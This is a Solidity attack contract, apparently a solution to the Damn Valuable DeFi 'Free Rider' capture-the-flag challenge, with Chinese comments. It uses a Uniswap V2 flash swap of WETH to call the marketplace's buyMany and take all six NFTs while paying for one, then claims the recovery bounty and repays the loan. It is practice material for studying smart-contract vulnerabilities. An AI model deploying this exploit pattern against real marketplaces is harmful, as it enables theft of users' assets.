// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {IUniswapV2Callee} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Address} from "@openzeppelin/contracts/utils/Address.sol";
import {SafeERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {WETH} from "solmate/tokens/WETH.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {FreeRiderNFTMarketplace} from "../../src/free-rider/FreeRiderNFTMarketplace.sol";
import {FreeRiderRecoveryManager} from "../../src/free-rider/FreeRiderRecoveryManager.sol";
import {console} from "forge-std/console.sol";
// // 接口定义
// interface IUniswapV2Callee {
//     function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external;
// }

// interface IUniswapV2Pair {
//     function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
//     function token0() external view returns (address);
//     function token1() external view returns (address);
//     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
// }

// interface IERC20 {
//     function transfer(address to, uint256 amount) external returns (bool);
//     function transferFrom(address from, address to, uint256 amount) external returns (bool);
//     function balanceOf(address account) external view returns (uint256);
//     function approve(address spender, uint256 amount) external returns (bool);
// }

// 主 Flash Swap 合约
contract SimpleFlashSwap is IUniswapV2Callee , IERC721Receiver { 
    address public owner;
    address public player;
    FreeRiderNFTMarketplace public marketplace;
    DamnValuableNFT public nft;
    FreeRiderRecoveryManager public recoveryManager;
    uint256 public constant NFT_COUNT = 6;
    // event FlashSwapExecuted(address indexed pair, uint256 profit);
    
    constructor(FreeRiderNFTMarketplace marketplaceP, DamnValuableNFT nftP, FreeRiderRecoveryManager recoveryManagerP,address playerAddress) {
        marketplace = marketplaceP ;
        nft = nftP;
        recoveryManager = recoveryManagerP ;
        player = playerAddress;
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    
    /**
     * @notice 启动 Flash Swap
     * @param pair Uniswap V2 交易对地址
     * @param tokenToBorrow 要借出的代币地址
     * @param amountToBorrow 要借出的数量
     */
    function startFlashSwap(
        address pair,
        address tokenToBorrow,
        uint256 amountToBorrow
    ) external onlyOwner {
        // 获取交易对中的代币
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();
        
        // 确定借出哪种代币
        uint256 amount0Out = tokenToBorrow == token0 ? amountToBorrow : 0;
        uint256 amount1Out = tokenToBorrow == token1 ? amountToBorrow : 0;
        
        require(amount0Out > 0 || amount1Out > 0, "Invalid token to borrow");
        
        // 调用 Uniswap 的 swap 函数，启动 Flash Swap
        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), abi.encode(pair));
       
    }
    
    /**
     * @notice Flash Swap 回调函数（Uniswap 自动调用）
     * @dev 此函数必须在同一交易内被调用和完成
     */
    function uniswapV2Call(
        address sender,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external override {
        // 1. 验证调用者是合法的 Uniswap 交易对
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();
        
        // 2. 确定借出了哪种代币及其数量
        uint256 amountBorrowed = amount0 > 0 ? amount0 : amount1;
        address tokenBorrowed = amount0 > 0 ? token0 : token1;
        address tokenOther = amount0 > 0 ? token1 : token0;
        
        // 3. 在此处执行你的业务逻辑
        // 示例：简单的套利 - 在实际应用中，这里可能是跨DEX套利、清算等
        executeBusinessLogic(tokenBorrowed, tokenOther, amountBorrowed);
      
    // 使用正确的 UniswapV2 公式计算还款金额
    // amountIn = (amountOut * reserveOther * 1000) / (reserveBorrowed * 997) + 1
    // 注意：这里的 reserveBorrowed 已经是更新后的（已减去 amountOut）
    uint256 amountToRepay = (amountBorrowed * 1000) / 997 + 1;
    console.log("Amount to repay (with fee):", amountToRepay);
    
    // 5. 将剩余的 ETH 转回 WETH
    uint256 ethBalance = address(this).balance;
    if (ethBalance > 0) {
        WETH wethContract = WETH(payable(tokenBorrowed));
        wethContract.deposit{value: ethBalance}();
    }

    
    // 6. 验证有足够的 WETH 归还
    uint256 wethBalance = IERC20(tokenBorrowed).balanceOf(address(this));
    console.log("WETH balance before repayment:", wethBalance);
    require(wethBalance >= amountToRepay, "Insufficient WETH to repay");
    
    // 7. 归还 WETH 给 Uniswap 交易对
    IERC20(tokenBorrowed).transfer(msg.sender, amountToRepay);
    
    // 8. 处理利润（剩余的 WETH）
    uint256 finalProfit = IERC20(tokenBorrowed).balanceOf(address(this));
    
    console.log("finalProfit",finalProfit);
    if (finalProfit > 0) {
        IERC20(tokenBorrowed).transfer(owner, finalProfit);
    }
        // emit FlashSwapExecuted(msg.sender, finalProfit);
    }
    
    /**
     * @notice 计算需要归还的代币数量
     * @dev 使用 Uniswap V2 公式: amountIn = (amountOut * reserveOther * 1000) / ((reserveBorrowed - amountOut) * 997) + 1
     */
    function calculateAmountToRepay(
        uint256 amountOut,
        uint256 reserveBorrowed,
        uint256 reserveOther
    ) public pure returns (uint256) {
        require(amountOut > 0, "Amount out must be positive");
        require(reserveBorrowed > amountOut, "Insufficient liquidity");
        
        uint256 numerator = amountOut * reserveOther * 1000;
        uint256 denominator = (reserveBorrowed - amountOut) * 997;
        return (numerator / denominator) + 1; // +1 防止四舍五入问题
    }
    
    /**
     * @notice 执行业务逻辑（示例：简单的套利）
     * @dev 在实际应用中，这里可能包含复杂的DEX交互
     */
    function executeBusinessLogic(
        address tokenBorrowed,
        address tokenOther,
        uint256 amountBorrowed
    ) internal {
        // 示例逻辑：将借来的 WETH 转换为 ETH，然后再转换回 WETH
        WETH weth = WETH(payable(tokenBorrowed));
        // uint256 wethBalanceBefore = weth.balanceOf(address(this));
        // require(wethBalanceBefore >= amount, "Insufficient WETH balance");
        
        // 调用WETH合约的withdraw函数，将WETH转换为ETH
        weth.withdraw(amountBorrowed);
        uint256[] memory ids = new uint256[](NFT_COUNT);
        for (uint256 i = 0; i < NFT_COUNT; i++) {
             ids[i] = i;
        }
         marketplace.buyMany{value: amountBorrowed}(ids);
        transferNFTsToRecovery();
        // uint256 amountToRepay = calculateAmountToRepay(amountBorrowed, reserveBorrowed, reserveOther);
        // repayFlashSwap(tokenBorrowed, amountToRepay);


    }

    function repayFlashSwap(address token, uint256 amount) internal {
        IERC20(token).transfer(msg.sender, amount);
    }

    /**
     * @notice 将 NFT 发送到 RecoveryManager
     */
    function transferNFTsToRecovery() internal {
        // 发送 6 个 NFT
        for (uint256 i = 0; i < NFT_COUNT; i++) {
            nft.safeTransferFrom(
                address(this),
                address(recoveryManager),
                i,
                abi.encode(address(this)) // 赏金接收者
            );
        }
    }
    
    
     /**
     * @notice ERC721 接收回调（必须实现）
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4) {
        // nftsReceived++;
        return IERC721Receiver.onERC721Received.selector;
    }


    /**
     * @notice 提取合约中的代币（仅所有者）
     */
    function withdrawToken(address token) external onlyOwner {
        uint256 balance = IERC20(token).balanceOf(address(this));
        require(balance > 0, "No balance to withdraw");
        IERC20(token).transfer(owner, balance);
    }
    
    /**
     * @notice 提取ETH（仅所有者）
     */
    function withdrawETH() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
    
    /**
     * @notice 接收ETH的回退函数
     */
    receive() external payable {}
}